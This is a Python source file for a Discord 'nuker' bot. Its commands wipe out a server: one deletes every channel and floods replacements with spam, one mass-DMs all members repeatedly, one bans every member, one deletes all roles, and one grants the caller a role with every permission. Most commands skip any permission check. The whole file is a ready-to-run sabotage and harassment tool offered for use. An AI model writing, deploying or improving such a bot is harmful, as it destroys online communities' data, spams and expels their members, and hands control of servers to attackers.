# packages
import discord
from discord.ext import commands
import asyncio
from dotenv import load_dotenv
import os

# config
load_dotenv()
TOKEN = os.getenv("TOKEN")

config = {
    "Prefix": ".",
    "Status": os.getenv("STATUS", "your server"),
}

# intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config["Prefix"], intents=intents)


# events
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} ({bot.user.id})")
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching, name=config["Status"]
        ),
    )

    print(
        f"Invite: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=157712&scope=bot"
    )

    print("\n----LOGS----\n")


@bot.event
async def on_command(ctx):
    print(
        f"[INFO] {ctx.author.name} has attempted to run command '{config['Prefix']}{ctx.command.name}' in #{ctx.channel.name} - {ctx.guild.name} ({ctx.guild.id})"
    )


@bot.event
async def on_command_error(ctx, error):
    await ctx.send(error)
    print(f"[ERROR] {error}")


# commands
@bot.command()
async def nuke(ctx, channelCount, messages, channelName, *, message):
    await ctx.send("Starting nuke...")

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(
                f"[INFO] Deleted channel {channel.name} in {ctx.guild.name} ({ctx.guild.id})"
            )

        except Exception as error:
            print(
                f"[ERROR] Couldn't delete channel {channel.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
            )

    for i in range(int(channelCount)):
        try:
            channel = await ctx.guild.create_text_channel(name=channelName)
            print(
                f"[INFO] Created text channel '{channelName}' in {ctx.guild.name} ({ctx.guild.id})"
            )

            for j in range(int(messages)):
                await channel.send(message)
        except Exception as error:
            print(
                f"Couldn't create text channel {channelName} in {ctx.guild.name} ({ctx.guild.id}): {error}"
            )


@bot.command()
async def dm(ctx, amount, *, alert):
    message = await ctx.send("Starting mass DM...")
    for i in range(int(amount)):
        for member in ctx.guild.members:
            try:
                await member.send(alert)
                print(
                    f"[INFO] Sent message {alert} to {member.display_name} ({member.id})."
                )
            except Exception as error:
                print(
                    f"[ERROR] Couldn't send message {alert} to {member.display_name} ({member.id}): {error}"
                )

    await message.delete()


@bot.command()
@commands.has_permissions(ban_members=True)
async def banall(ctx):
    if ctx.guild.get_member(bot.user.id).guild_permissions.ban_members == False:
        print("[ERROR] Bot does not have ban permissions")
        return

    message = await ctx.send("Starting mass ban...")

    for member in ctx.guild.members:
        try:
            await ctx.guild.ban(member)
            print(
                f"[INFO] Succesfully banned user {member.name} ({member.id}) in {ctx.guild.name} ({ctx.guild.id})"
            )

        except Exception as error:
            print(
                f"[ERROR] Failed to ban {member.name} ({member.id}) in {ctx.guild.name} ({ctx.guild.id}): {error}"
            )

    await message.delete()


@bot.command()
async def deleteroles(ctx):
    message = await ctx.send("Starting mass role deletion...")
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(
                f"[INFO] Administrator role '{role.name}' has been deleted in {ctx.guild.name} ({ctx.guild.id})"
            )
        except Exception as error:
            print(
                f"[ERROR] Failed to delete role {role.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
            )

    await message.delete()


@bot.command()
async def hoist(ctx, name):
    try:
        role = await ctx.guild.create_role(
            name=name, permissions=discord.Permissions.all()
        )

        await ctx.author.add_roles(role)

        print(
            f"[INFO] Role {role.name} has been succesfully given to {ctx.author.name} ({ctx.author.id}) in {ctx.guild.name} ({ctx.guild.id})"
        )

        message = await ctx.send(
            f"You have succesfully been given the role <@&{role.id}>"
        )
        await asyncio.sleep(3)

        await message.delete()
    except Exception as error:
        print(
            f"[ERROR] Failed to give role {role.name} to {ctx.author.name} ({ctx.author.id}) in {ctx.guild.name} ({ctx.guild.id}): {error}"
        )


bot.remove_command("help")


@bot.command()
async def help(ctx):
    commands = [f"{config['Prefix']}{command.name}" for command in bot.commands]

    embed = discord.Embed(title="Help", description="Help :3")
    embed.add_field(name="Commands", value="\n".join(commands))

    await ctx.send(embed=embed)


bot.run(TOKEN)
